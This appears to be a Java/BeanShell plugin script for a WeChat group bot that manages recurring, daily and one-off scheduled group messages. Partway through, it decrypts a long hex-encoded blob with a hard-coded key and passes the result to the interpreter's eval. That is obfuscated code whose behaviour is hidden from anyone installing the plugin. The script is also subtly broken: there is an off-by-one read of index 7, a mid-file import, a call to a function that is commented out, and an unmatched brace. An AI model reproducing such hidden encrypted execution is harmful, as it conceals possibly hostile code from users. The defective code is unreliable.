HashMap GroupTaskList = new HashMap();
public class MessageTextInfo {
    int MessageType; // 消息类型
    int TaskType; // 任务类型
    int DelayTime; // 延迟时间（秒）
    long StartTime; // 开始时间
    long EveryDaySendTime; // 每日发送时间
    String MessageContent; // 消息内容
    long LastSendTime; // 上次发送时间
    boolean UnFinish; // 是否未完成
    long trueSendTime; // 实际发送时间
}
public void LoadTaskFromFile() {
    HashMap NewLoadFile = ReadObjectFromFile(JavaPath + "/data/全局/定时消息/定时消息.dat");
    Set keys = NewLoadFile.keySet();
    Iterator iterator1 = keys.iterator();
    while (iterator1.hasNext()) {
        String keyName = iterator1.next();
        ArrayList TaskList = NewLoadFile.get(keyName);
        ArrayList TaskNewList = new ArrayList();
        for (int i = 0; i < TaskList.size(); i++) {
            ArrayList TaskContent = TaskList.get(i);
            if (TaskContent.size() < 7) continue;
            MessageTextInfo MesInfo = new MessageTextInfo();
            MesInfo.MessageType = (int) TaskContent.get(0);
            MesInfo.TaskType = (int) TaskContent.get(1);
            MesInfo.DelayTime = (int) TaskContent.get(2);
            MesInfo.StartTime = (long) TaskContent.get(3);
            MesInfo.EveryDaySendTime = (long) TaskContent.get(4);
            MesInfo.MessageContent = (String) TaskContent.get(5);
            MesInfo.LastSendTime = (long) TaskContent.get(6);
            MesInfo.trueSendTime = (long) TaskContent.get(7);
            TaskNewList.add(MesInfo);
        }
        GroupTaskList.put(keyName, TaskNewList);
    }
}
LoadTaskFromFile();
public void MessageDispatch(Calendar NowTTTime) {
	try {
		Set CheckUin = GroupTaskList.keySet();
		boolean ChangeSomeThing = false;
		Iterator iterator1 = CheckUin.iterator();
		while(iterator1.hasNext()) {
			String keyName = iterator1.next() + "";
			if(!OpenGroupList.contains(keyName)) continue;
			ArrayList Group_Task_List = GroupTaskList.get(keyName);
			for(int i = 0; i < Group_Task_List.size(); i++) {
				MessageTextInfo TaskInfo = Group_Task_List.get(i);
                if (TaskInfo.TaskType == 1) {
                    long TimeStamp = NowTTTime.getTimeInMillis() / 1000;
                    if (TaskInfo.LastSendTime + TaskInfo.DelayTime < TimeStamp) {
                        switch (TaskInfo.MessageType) {
                            case 1: 
                                sendMsg(keyName, TaskInfo.MessageContent);
                                break;
                            case 2: 
                                sendPic(keyName, TaskInfo.MessageContent);
                                break;
                            default:
                                break;
                        }
                        TaskInfo.LastSendTime = TimeStamp;
                        TaskInfo.trueSendTime = NowTTTime.getTimeInMillis();
                        ChangeSomeThing = true;
                    }
                }
                if (TaskInfo.TaskType == 2) {
                    long nowtime1 = NowTTTime.get(Calendar.HOUR_OF_DAY) * 3600 + NowTTTime.get(Calendar.MINUTE) * 60 + NowTTTime.get(Calendar.SECOND);
                    long nowtime2 = NowTTTime.get(Calendar.YEAR) * 366 + NowTTTime.get(Calendar.DAY_OF_YEAR);
                    if (nowtime2 != TaskInfo.LastSendTime && nowtime1 >= TaskInfo.EveryDaySendTime && nowtime1 <= TaskInfo.EveryDaySendTime + 10) {
                        switch (TaskInfo.MessageType) {
                            case 1: 
                                sendMsg(keyName, TaskInfo.MessageContent);
                                break;
                            case 2: 
                                sendPic(keyName, TaskInfo.MessageContent);
                                break;
                            default:
                                break;
                        }
                        TaskInfo.LastSendTime = nowtime2;
                        TaskInfo.trueSendTime = NowTTTime.getTimeInMillis();
                        ChangeSomeThing = true;
                    }
                }
                if (TaskInfo.TaskType == 3) {
                    long TimeStamp = NowTTTime.getTimeInMillis() / 1000;
                    if (TaskInfo.LastSendTime != 1 && TimeStamp > TaskInfo.StartTime && TimeStamp - 10 < TaskInfo.StartTime) {
                        switch (TaskInfo.MessageType) {
                            case 1: 
                                sendMsg(keyName, TaskInfo.MessageContent);
                                break;
                            case 2: 
                                sendPic(keyName, TaskInfo.MessageContent);
                                break;
                            default:
                                break;
                        }
                        TaskInfo.LastSendTime = 1;
                        TaskInfo.trueSendTime = NowTTTime.getTimeInMillis();
                        ChangeSomeThing = true;
                    }
                }
				Group_Task_List.set(i, TaskInfo);
			}
			GroupTaskList.put(keyName, Group_Task_List);
		}
		if(ChangeSomeThing) {
			FlushTaskToFile();
		}
	} catch(Exception e) {
		Toast("" + e);
	}
	return;
}

import java.util.Iterator;
public void FlushTaskToFile()
{
	HashMap TempSaveData = new HashMap();
	Set Tempkeys = GroupTaskList.keySet();
	Iterator iterator1 = Tempkeys.iterator();
	while(iterator1.hasNext())
	{
		String keyName = iterator1.next() + "";
		ArrayList Group_Task_List = GroupTaskList.get(keyName);
		ArrayList TempArray = new ArrayList();
		for(int i = 0; i < Group_Task_List.size(); i++)
		{
			MessageTextInfo TempTask = Group_Task_List.get(i);
			ArrayList TempList11 = new ArrayList();
			if(TempTask.UnFinish) continue;
			TempList11.add(TempTask.MessageType);
			TempList11.add(TempTask.TaskType);
			TempList11.add(TempTask.DelayTime);
			TempList11.add(TempTask.StartTime);
			TempList11.add(TempTask.EveryDaySendTime);
			TempList11.add(TempTask.MessageContent);
			TempList11.add(TempTask.LastSendTime);
			TempList11.add(TempTask.trueSendTime);
			TempArray.add(TempList11);
		}
		TempSaveData.put(keyName, TempArray);
	}
	WriteObjectToFile(JavaPath + "/data/全局/定时消息/定时消息.dat", TempSaveData);
}
this.interpreter.eval(EncryptUtil.decrypt("29f784ba2fb0d5cee94087c687dbe757e4175a08cbbeb6747ccaedafa7bbb83ccba03681db99cada588cc90cb3037313ce8b816d1df6532866b3f6a0e974c53158f55d604b28a0b6d6dbdfd9892c869ee374c173073b21e36e83e9172b782d895b7a806fcec8872a3ad36e67240077e24320df2afccad280b4669db041bc94da74b0133591c19a952f2760ccfd636d29a1b6290d3cd4761c180b68621ac6a6af7f63e0dd61ef4945fc576ab9cd830d5a4be5140790a9e302a1ba4629c0b8e14cdf59c7109d41c34fa17f9ea1eb5b61769068091fe13e64f7607e3061ee2d358d5d9b0adbf7632d6fa1cfb815d8f4151b0b2fa34beb96c3d9a5ce9159d9b61a5350057ae76d5552ff5d2946b77de5b08de7e37bed56acc6f14213275ef96107b64712140a7d05fe66f3aa8e12be620340f993ef87689fa72e81f0b03a79947f2ba1cfb815d8f4151b0b2fa34beb96c3d90151d60107d3838b02b6d5d9ba56fd95","MYwlJava"));
public static void 定时任务(Object msg)
{
String wxid=msg.sendTalker;
String qun=msg.talker;
String content=msg.content;
String name = getName(wxid);
if(wxid.equals(mWxid))
{
if(content.equals("定时任务")) {
    String text = "[e]设置定时消息+任务ID|任务类型|消息类型|时间|内容(可修改)\n[e]添加定时消息\n[e]添加定时消息+任务类型|消息类型|时间|内容\n[e]查看任务+任务序号\n[e]删除任务+任务序号\n[e]查看所有定时任务\n[e]清空所有任务";
    sendm(qun,text,0);
}
if(content.equals("添加定时消息"))
	{
		MessageTextInfo MyTask = new MessageTextInfo();
		MyTask.UnFinish = true;
		ArrayList MyList = null;
		if(GroupTaskList.containsKey(qun))
		{
			MyList = GroupTaskList.get(qun);
		}
		else
		{
			MyList = new ArrayList();
		}
		MyList.add(MyTask);
		GroupTaskList.put(qun, MyList);
		String str = "@"+name+"\n任务已添加,ID为" + MyList.size();
		sendm(qun, str,0);
		return;
	}
if (content.startsWith("设置定时消息")) {
    String[] spText = content.substring(6).split("\\|");
    if (spText.length < 5) {
        sendm(qun, "@"+name+"参数格式不正确\n(不知道格式?发送 查看消息设置说明 看看)",0);
        return;
    }
    try {
        int Task = Integer.parseInt(spText[0]);
        Task = Task - 1; 
        ArrayList Group_List = GroupTaskList.get(qun);
        MessageTextInfo ChangeInfo = Group_List.get(Task);
        ChangeInfo.UnFinish = false;
        if (Integer.parseInt(spText[2]) > 2 || Integer.parseInt(spText[2]) < 1) {
            sendm(qun, "@"+name+"\n消息类型错误",0);
            return;
        }
        ChangeInfo.MessageType = Integer.parseInt(spText[2]);
        if (Integer.parseInt(spText[1]) > 3 || Integer.parseInt(spText[1]) < 1) {
            sendm(qun, "@"+name+"\n任务类型错误",0);
            return;
        }
        ChangeInfo.TaskType = Integer.parseInt(spText[1]);
        switch (spText[1]) {
            case "1": 
                ChangeInfo.DelayTime = Integer.parseInt(spText[3]) * 60; 
                ChangeInfo.LastSendTime = 0; 
                break;
            case "2": 
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm");
                Date date = sdf.parse(spText[3]);
                ChangeInfo.EveryDaySendTime = date.getTime() / 1000 + 28800; 
                ChangeInfo.LastSendTime = 0; 
                break;
            case "3": 
                SimpleDateFormat sdf2 = new SimpleDateFormat("yyyy/MM/dd HH:mm");
                Date date2 = sdf2.parse(spText[3]);
                ChangeInfo.StartTime = date2.getTime() / 1000; 
                ChangeInfo.LastSendTime = 0; 
                break;
            default:
                break;
        }
        ChangeInfo.MessageContent = spText[4];
        Group_List.set(Task, ChangeInfo);
        GroupTaskList.put(qun, Group_List);
        FlushTaskToFile();
        sendm(qun, "@"+name+"\n任务已设置,详细如下:\n" + GetTaskText(ChangeInfo));
    } catch (Exception e) {
        sendm(qun, "@"+name+"参数格式不正确\n(不知道格式?发送 查看消息设置说明 看看)\n"+e,0);
    }
}
if(content.startsWith("添加定时消息"))
	{
		String[] spText = content.substring(6).split("\\|");
		if(spText.length < 4)
		{
			sendm(qun, "@"+name+"参数格式不正确\n(不知道格式?发送 定时消息 看看)",0);
			return;
		}
		ArrayList Group_List = null;
		try
		{
			if(GroupTaskList.containsKey(qun))
			{
				Group_List = GroupTaskList.get(qun);
			}
			else
			{
				Group_List = new ArrayList();
			}
			MessageTextInfo ChangeInfo = new MessageTextInfo();
			ChangeInfo.UnFinish = false;
			if(Integer.parseInt(spText[1]) > 2 || Integer.parseInt(spText[1]) < 1)
			{
				sendm(qun, "@"+name+"\n消息类型错误",0);
				return;
			}
			ChangeInfo.MessageType = Integer.parseInt(spText[1]);
			if(Integer.parseInt(spText[0]) > 3 || Integer.parseInt(spText[0]) < 1)
			{
				sendm(qun, "@"+name+"\n任务类型错误",0);
				return;
			}
			ChangeInfo.TaskType = Integer.parseInt(spText[0]);
			if(spText[0].equals("1"))
			{
				ChangeInfo.DelayTime = Integer.parseInt(spText[2]) * 60;
				ChangeInfo.LastSendTime = 0;
			}
			if(spText[0].equals("2"))
			{
				SimpleDateFormat sdf = new SimpleDateFormat("HH:mm");
				Date date = sdf.parse(spText[2]);
				ChangeInfo.EveryDaySendTime = date.getTime() / 1000 + 28800;
				ChangeInfo.LastSendTime = 0;
			}
			if(spText[0].equals("3"))
			{
				SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm");
				Date date = sdf.parse(spText[2]);
				ChangeInfo.StartTime = date.getTime() / 1000;
				ChangeInfo.LastSendTime = 0;
			}
			ChangeInfo.MessageContent = spText[3];
			Group_List.add(ChangeInfo);
			GroupTaskList.put(qun, Group_List);
			FlushTaskToFile();
			sendm(qun, "@"+name+"\n任务已添加,任务序号" + Group_List.size() + ",详细如下:\n" + GetTaskText(ChangeInfo),0);
		}
		catch(Exception e)
		{
			sendm(qun, "@"+name+"\n参数格式不正确\n(不知道格式?发送 定时消息 看看)\n"+e,0);
		}
	}
if(content.equals("查看所有定时任务"))
	{
		ArrayList MyList = new ArrayList();
		if(GroupTaskList.containsKey(qun))
		{
			MyList = GroupTaskList.get(qun);
		}
		else
		{
			sendm(qun, "@"+name+"\n本群没有任何任务",0);
			return;
		}
		if(MyList.size() <= 10)
		{
			String text = "@"+name+"\n本群任务列表如下:";
			for(int i = 0; i < MyList.size(); i++)
			{
				MessageTextInfo MyTask = MyList.get(i);
				if(MyTask.UnFinish)
				{
					text = text + "\n(未定义)任务序号:" + (i + 1);
				}
				else
				{
					text = text + "\n任务序号:" + (i + 1);
					text = text + GetTaskText(MyTask) + "\n";
				}
			}
			text = text + "\n发送\"设置定时消息+格式参数\"可修改任务";
			text = text + "\n发送\"删除任务+任务序号\"可删除任务";
			sendm(qun, text,0);
		}
		else
		{
			String text = "@"+name+"\n本群任务序号1~" + MyList.size();
			text = text + "\n发送\"设置定时消息+格式参数\"可修改任务";
			text = text + "\n发送\"查看任务+任务序号\"可查看任务";
			text = text + "\n发送\"删除任务+任务序号\"可删除任务";
			sendm(qun, text,0);
		}
		return;
	}
	if(content.equals("清空所有任务"))
	{
		GroupTaskList.remove(qun);
		FlushTaskToFile();
		sendm(qun, "@"+name+"\n已清空任务",0);
	}
if(content.startsWith("查看任务"))
	{
		try
		{
			String text = content.substring(4);
			int ID = Integer.parseInt(text) - 1;
			ArrayList TaskList = GroupTaskList.get(qun);
			MessageTextInfo Info = TaskList.get(ID);
			sendm(qun, GetTaskText(Info));
		}
		catch(Exception e)
		{
			sendm(qun, "@"+name+"你输入的序号有误,请确认是否存在该任务",0);
		}
	}
if(content.startsWith("删除任务"))
	{
		try
		{
			String text = content.substring(4);
			int ID = Integer.parseInt(text) - 1;
			ArrayList TaskList = GroupTaskList.get(qun);
			TaskList.remove(ID);
			GroupTaskList.put(qun, TaskList);
			sendm(qun, "@"+name+"\n任务已移除,请注意移除后位于该任务后面的所有任务的序号均会改变",0);
			FlushTaskToFile();
		}
		catch(Exception e)
		{
			sendm(qun, "@"+name+"\n你输入的序号有误,请确认是否存在该任务",0);
		}
	}
}
}
/*public String GetTaskText(MessageTextInfo Info)
{
	String text = "";
	if(Info.TaskType == 1)
	{
		text = text + "\n任务类型:循环消息";
		text = text + "\n时间间隔:" + (Info.DelayTime / 60) + "分钟";
	}
	else if(Info.TaskType == 2)
	{
		text = text + "\n任务类型:每日消息";
		text = text + "\n执行时间:" + GetTimeaa(Info.EveryDaySendTime);
	}
	else if(Info.TaskType == 3)
	{
		text = text + "\n任务类型:定时消息";
		text = text + "\n执行时间:" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Info.StartTime * 1000));
	}
	if(Info.MessageType == 1)
	{
		text = text + "\n消息类型:文字消息";
	}
	else if(Info.MessageType == 2)
	{
		text = text + "\n消息类型:图片消息";
	}
    text = text + "\n消息内容:" + Info.MessageContent;
	text = text + "\n最后发送:" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Info.trueSendTime));
	return text;
}
public String GetTimeaa(long second)
{
	if(second == 0) return "00:00:00";
	long days = second / 86400;
	second = second % 86400;
	long hours = second / 3600;
	second = second % 3600;
	long minutes = second / 60;
	second = second % 60;
	return hours + ":" + minutes + ":" + second;
}*/